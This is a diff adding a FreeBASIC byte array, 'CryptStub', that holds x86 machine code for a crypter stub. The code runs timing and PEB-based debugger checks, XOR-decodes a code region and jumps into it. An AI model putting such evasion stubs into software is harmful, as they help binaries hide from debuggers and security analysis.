@@ -1,0 +1,9 @@
+Dim Shared As UByte CryptStub(76) = {&HEB, _
+&H9,&H2E,&H4A,&H61,&H44,&H6F,&H67,&H67,&H2E,&H0, _
+&H60,&H66,&H9C,&HF,&H31,&H31,&HC9,&H1,&HC1,&HF, _
+&H31,&H29,&HC8,&H3D,&HFF,&HF,&H0,&H0,&H73,&HEF, _
+&H64,&HA1,&H18,&H0,&H0,&H0,&H8B,&H40,&H30,&HF, _
+&HB6,&H40,&H2,&H83,&HF8,&H1,&H74,&HDD,&HBB,&H35, _
+&H18,&H40,&H0,&H80,&HB3,&H0,&H10,&H40,&H0,&H90, _
+&H4B,&H83,&HFB,&HFF,&H75,&HF3,&H66,&H9D,&H61,&HB8, _
+&H35,&H18,&H40,&H0,&HFF,&HE0}
